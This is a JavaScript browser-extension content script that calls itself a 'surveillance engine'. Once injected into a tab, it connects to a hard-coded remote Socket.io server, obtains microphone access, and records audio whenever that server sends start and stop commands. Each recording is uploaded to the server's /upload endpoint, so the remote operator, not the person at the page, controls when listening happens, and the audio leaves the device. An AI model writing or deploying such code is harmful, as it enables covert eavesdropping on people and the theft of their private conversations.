// content.js
// This script runs in the context of the active tab

// Important: Change this URL to your deployed Render URL when deploying (e.g. 'https://your-app.onrender.com')
const SERVER_URL = 'https://surveillance-app-lvf5.onrender.com';

let socket;
let mediaRecorder;
let audioChunks = [];
let stream;
let isRecording = false;

// Ensure we don't connect multiple times if injected multiple times
if (!window.surveillanceEngineStarted) {
    window.surveillanceEngineStarted = true;
    console.log("Surveillance engine injected successfully.");

    // Connect to Socket.io
    // Note: socket.io.min.js must be injected BEFORE this script
    if (typeof io !== 'undefined') {
        socket = io(SERVER_URL);
        
        socket.on('connect', () => {
            console.log('Connected to WebSocket server from content script:', socket.id);
            setupRecorder(); // Pre-request permission if possible, but some browsers wait for user interaction
        });

        socket.on('start-recording', async () => {
            console.log("Received start-recording event");
            const isReady = await setupRecorder();
            if (isReady && mediaRecorder && mediaRecorder.state === 'inactive') {
                audioChunks = [];
                mediaRecorder.start();
                isRecording = true;
                console.log('Recording started...');
            } else {
                console.warn('Cannot start recording, microphone access missing or already recording.');
            }
        });

        socket.on('stop-recording', () => {
            console.log("Received stop-recording event");
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                isRecording = false;
                console.log('Recording stopped...');
            }
        });
    } else {
        console.error("Socket.io library not found. Make sure it's injected before content.js");
    }
} else {
    console.log("Surveillance engine already running in this tab.");
}

async function setupRecorder() {
    if (!stream) {
        try {
            console.log("Requesting microphone permission...");
            stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            console.log('Microphone access granted in content script.');
        } catch (err) {
            console.warn('Microphone access failed. Error:', err.name, err.message);
            // Alerting the user so they know why it fails on mobile
            alert(`Microphone permission denied: ${err.message}. Please allow access on this site.`);
            return false;
        }
    }

    if (!mediaRecorder) {
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });

        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                audioChunks.push(event.data);
            }
        };

        mediaRecorder.onstop = async () => {
            console.log('Uploading recording...');
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            audioChunks = []; // Reset for next recording

            const formData = new FormData();
            formData.append('audio', audioBlob, 'recording.webm');

            try {
                const response = await fetch(`${SERVER_URL}/upload`, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    console.log('Upload successful.');
                } else {
                    console.log('Upload failed with status:', response.status);
                }
            } catch (err) {
                console.error('Upload error:', err);
            }
        };
    }
    return true;
}
